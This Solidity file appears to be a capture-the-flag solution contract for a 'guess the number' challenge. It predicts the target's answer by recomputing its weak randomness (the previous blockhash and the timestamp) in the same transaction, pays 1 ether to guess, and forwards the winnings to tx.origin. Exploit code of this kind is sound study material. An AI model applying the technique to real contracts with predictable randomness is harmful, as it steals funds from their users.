//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IGuessTheNumber {
    function guess(uint8 n) external payable;

    function isComplete() external view returns (bool);
}

contract GuessTheNumber {
    IGuessTheNumber public constant guess =
        IGuessTheNumber(0xdE38187C09F6B1f71Ca84541Fd3C9dDb6a7a52Da);

    function attack() external payable {
        // simulate the same what the challenge contract does
        require(address(this).balance >= 1 ether, "not enough funds");
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        guess.guess{value: 1 ether}(answer);

        require(guess.isComplete(), "challenge not completed");
        // return all of it to EOA
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}
